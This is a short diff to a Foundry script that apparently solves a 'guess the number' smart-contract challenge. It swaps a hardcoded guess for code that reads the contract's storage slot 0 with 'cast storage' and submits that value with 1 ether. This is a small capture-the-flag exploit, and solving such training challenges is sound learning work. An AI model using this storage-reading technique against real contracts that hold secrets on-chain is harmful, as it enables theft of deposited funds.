@@ -17,7 +17,23 @@ contract SolveGuessTheNumberScript is Script {
 
         vm.startBroadcast(deployerPrivateKey);
 
-        guessthenumberChallenge.guess{value: 1 ether}(42);
+        string[] memory inputs = new string[](4);
+        inputs[0] = "cast";
+        inputs[1] = "storage";
+        inputs[2] = "0x8464135c8f25da09e49bc8782676a84730c318bc";
+        inputs[3] = "0";
+
+        bytes memory res = vm.ffi(inputs);
+        bytes32 output = abi.decode(res, (bytes32));  
+
+        uint8 answer = uint8(
+            uint256(  
+                output
+            )
+        ); 
+
+
+        guessthenumberChallenge.guess{value: 1 ether}(answer);
 
         vm.stopBroadcast();
     }
